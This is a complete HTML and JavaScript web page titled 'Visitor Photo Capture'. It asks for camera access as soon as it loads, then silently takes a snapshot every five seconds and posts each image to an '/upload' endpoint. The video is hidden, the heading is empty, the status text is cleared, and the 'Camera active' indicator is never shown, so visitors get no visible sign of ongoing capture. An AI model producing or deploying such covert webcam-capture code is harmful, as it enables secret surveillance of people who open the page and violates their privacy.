
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Visitor Photo Capture</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 30px;
    }

    #status {
      overflow-wrap: anywhere;
    }

    #indicator {
      display: none;
      color: red;
    }
  </style>
</head>
<body>

  <h3></h3>

  <p id="indicator" style="display:hidden;">● Camera active</p>
  <p id="status">Requesting camera permission...</p>

  <video id="video" autoplay playsinline muted hidden></video>
  <canvas id="canvas" width="320" height="240" hidden></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const status = document.getElementById('status');
    const indicator = document.getElementById('indicator');

    let stream = null;
    let timer = null;
    let busy = false;
    let count = 0;

    async function capturePhoto() {
      if (busy || video.readyState < 2) return;

      busy = true;

      try {
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, 320, 240);

        const image = canvas.toDataURL('image/jpeg', 0.7);

        const response = await fetch('/upload', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ image })
        });

        const data = await response.json();

        if (!response.ok || !data.ok) {
          throw new Error(data.error || `HTTP ${response.status}`);
        }

        count++;
        status.textContent = ``;

        console.log('Photo saved:', data.file);

      } catch (error) {
        console.error('Photo upload error:', error);
        status.textContent = 'Upload error: ' + error.message;
      } finally {
        busy = false;
      }
    }

    async function startCamera() {
      try {
        if (!navigator.mediaDevices?.getUserMedia) {
          throw new Error('Camera requires HTTPS or localhost');
        }

        stream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: false
        });

        video.srcObject = stream;
        await video.play();

        indicator.style.display = 'hidden';
        status.textContent = '';

        // Capture first photo, then repeat every 5 seconds
        await capturePhoto();
        timer = setInterval(capturePhoto, 5000);

      } catch (error) {
        console.error('Camera error:', error);

        status.textContent =
          'Camera error: ' + error.message;

        if (stream) {
          stream.getTracks().forEach(track => track.stop());
          stream = null;
        }

        video.srcObject = null;
        indicator.style.display = 'none';

        if (timer) clearInterval(timer);
        timer = null;
      }
    }

    // Ask for browser camera permission on page load
    startCamera();
  </script>

</body>
</html>
